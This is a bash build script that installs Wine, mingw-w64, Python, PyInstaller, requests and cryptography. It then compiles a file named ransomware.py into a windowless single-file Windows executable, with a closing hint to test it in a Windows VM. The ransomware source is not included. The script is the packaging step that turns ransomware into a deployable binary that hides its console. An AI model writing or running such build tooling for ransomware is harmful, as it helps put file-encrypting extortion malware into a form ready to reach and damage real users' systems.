#!/bin/bash
echo "🚀 Setting up Windows cross-compilation environment..."
echo ""

# Update package list
sudo apt update

# Enable multiarch for 32-bit support
echo "📦 Enabling multiarch for 32-bit support..."
sudo dpkg --add-architecture i386
sudo apt update

# Install Wine and dependencies
echo "📦 Installing Wine and dependencies..."
sudo apt install -y wine wine32 wine64

# Install mingw-w64 (correct package name)
echo "📦 Installing mingw-w64 cross-compiler..."
sudo apt install -y mingw-w64

# Install Python packages in Wine
echo "📦 Setting up Python in Wine..."
wine python --version 2>/dev/null || echo "Python not found in Wine, installing..."

# Download and install Python for Wine
if [ ! -f python-installer.exe ]; then
    echo "📥 Downloading Python installer..."
    wget https://www.python.org/ftp/python/3.9.0/python-3.9.0-amd64.exe -O python-installer.exe
fi

echo "🔧 Installing Python in Wine (this may take a minute)..."
wine python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 2>/dev/null

# Wait for installation to complete
sleep 5

echo "📦 Installing PyInstaller in Wine..."
wine pip install pyinstaller 2>/dev/null

echo "📦 Installing required Python packages in Wine..."
wine pip install requests cryptography 2>/dev/null

# Build the executable
echo "🔨 Building Windows executable..."
wine pyinstaller --onefile --noconsole ransomware.py

echo ""
echo "✅ Done!"
echo "📁 Executable is in: dist/ransomware.exe"
echo ""
echo "⚠️  IMPORTANT: This is built for Windows!"
echo "   Transfer it to a Windows VM to test."
